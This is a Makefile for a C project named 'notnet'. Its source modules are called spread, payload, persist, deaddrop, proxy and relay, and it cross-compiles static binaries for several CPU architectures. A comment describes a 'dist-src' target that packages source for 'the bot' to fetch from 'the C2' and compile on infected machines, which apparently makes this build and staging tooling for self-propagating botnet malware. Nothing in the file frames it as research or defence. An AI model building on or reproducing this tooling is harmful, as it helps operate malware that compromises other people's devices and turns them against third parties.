# notnet - Build system
# Pure C, cross-platform, multi-architecture

CC ?= gcc
CFLAGS := -Wall -Wextra -O2 -static
LDFLAGS := -lpthread

# TLS support: make TLS=1 to enable OpenSSL
ifdef TLS
  CFLAGS += -DTLS_ENABLED
  LDFLAGS += -lssl -lcrypto
  # Non-static build for TLS (dynamic linking to libssl/libcrypto)
  CFLAGS := $(CFLAGS:-static=)
endif

# Architecture detection
ARCH := $(shell uname -m)
UNAME := $(shell uname -s)

# Include paths
INCLUDES := -I include

# Source files
SRCS := notnet.c \
        src/protocol.c \
        src/spread.c \
        src/payload.c \
        src/persist.c \
        src/util.c \
        src/deaddrop.c \
        src/proxy.c \
        src/relay.c

OBJS := $(SRCS:.c=.o)

# Build output
TARGET := notnet

# ── Default target ───────────────────────────────────────
all: $(TARGET)

$(TARGET): $(OBJS)
	$(CC) $(LDFLAGS) -o $@ $^
	@echo "Built $(TARGET) for $(ARCH)"
	@echo "Version: $(shell grep 'define NOTNET_VERSION' include/config.h | awk -F'"' '{print $$2}')"

%.o: %.c
	$(CC) $(CFLAGS) $(INCLUDES) -c $< -o $@

# ── Architecture-specific builds ──────────────────────────
build-x86_64:
	@echo "Building for x86_64..."
	@mkdir -p build/x86_64
	$(CC) $(CFLAGS) $(INCLUDES) -m64 -o build/x86_64/$(TARGET) $(SRCS)

build-armv7l:
	@echo "Building for armv7l..."
	@mkdir -p build/armv7l
	arm-linux-gnueabihf-gcc $(CFLAGS) $(INCLUDES) -o build/armv7l/$(TARGET) $(SRCS)

build-aarch64:
	@echo "Building for aarch64..."
	@mkdir -p build/aarch64
	aarch64-linux-gnu-gcc $(CFLAGS) $(INCLUDES) -o build/aarch64/$(TARGET) $(SRCS)

build-riscv64:
	@echo "Building for riscv64..."
	@mkdir -p build/riscv64
	riscv64-linux-gnu-gcc $(CFLAGS) $(INCLUDES) -o build/riscv64/$(TARGET) $(SRCS)

# ── Clean ─────────────────────────────────────────────────
clean:
	rm -f $(OBJS) $(TARGET)
	rm -rf build/

# ── Distribution ─────────────────────────────────────────
dist: all
	@mkdir -p dist
	@echo "Creating distribution archive..."
	tar czf dist/notnet-$(ARCH)-$(shell date +%Y%m%d).tar.gz \
		$(TARGET) \
		README.md \
		LICENSE \
		Makefile

# ── On-target compilation source bundle ─────────────────
# Produces the uncompressed source tarball the bot fetches for
# on-target compilation. Serve this from the C2 (e.g. /notnet-src.tar)
# and pin it with payload_source_sha256= in the bot config.
DIST_SRC_FILES := notnet.c \
                  src/protocol.c src/spread.c src/payload.c \
                  src/persist.c src/util.c src/deaddrop.c src/proxy.c \
                  src/relay.c \
                  include/config.h include/protocol.h include/spread.h \
                  include/payload.h include/persist.h include/util.h \
                  include/deaddrop.h include/proxy.h include/relay.h \
                  Makefile
dist-src:
	@mkdir -p dist
	@echo "Creating on-target compilation source bundle..."
	@tar cf dist/notnet-src.tar $(DIST_SRC_FILES)
	@echo "Source bundle: dist/notnet-src.tar"
	@echo "SHA-256 pin for payload_source_sha256:"
	@sha256sum dist/notnet-src.tar

# ── Help ─────────────────────────────────────────────────
help:
	@echo "notnet build system"
	@echo ""
	@echo "Targets:"
	@echo "  all          Build for current architecture"
	@echo "  clean        Remove build artifacts"
	@echo "  dist         Create distribution archive"
	@echo "  dist-src     Create on-target compilation source bundle + pin"
	@echo "  help         Show this help"
	@echo ""
	@echo "Architecture-specific targets:"
	@echo "  build-x86_64    Build for x86_64"
	@echo "  build-armv7l    Build for ARMv7"
	@echo "  build-aarch64   Build for ARM64"
	@echo "  build-riscv64   Build for RISC-V"
	@echo "  ARMv6l, MIPS, and PowerPC targets are not currently supported"
	@echo ""
	@echo "Cross-compilation requires target toolchains"
	@echo "Example: make build-x86_64"

.PHONY: all clean dist help
